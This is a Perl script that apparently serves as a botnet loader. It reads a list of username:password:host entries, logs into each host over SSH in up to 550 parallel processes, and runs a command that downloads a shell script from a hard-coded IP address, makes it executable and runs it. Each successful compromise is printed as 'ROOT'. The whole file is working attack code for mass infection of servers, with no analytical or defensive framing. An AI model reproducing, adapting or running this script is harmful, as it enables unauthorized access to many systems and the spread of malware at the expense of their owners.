#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;

$file = shift @ARGV;
open(fh, '<',$file) or die "Can't read file '$file' [$!]\n"; @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);

}
my $pm = new Parallel::ForkManager(550); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /run || cd /; wget http://95.141.44.217/b/XS.sh; chmod 777 XS.sh; sh XS.sh');
                        sleep 10;
                        $channel->close;
                        print "\e[35;1mLlcommant sentg [\x1b[1;32m\x1b[1;35m] ROOT ~>: ".$newarray[$c]."\n";
                } else {
                        print "\e[34;1mchecking \x1b[1;35m\n";
                }
        } else {
                print "\e[36;1mNoPE [\x1b[1;32mGOOFY\x1b[1;37m]\n";
        }
        $pm->finish;
}
$pm->wait_all_children;

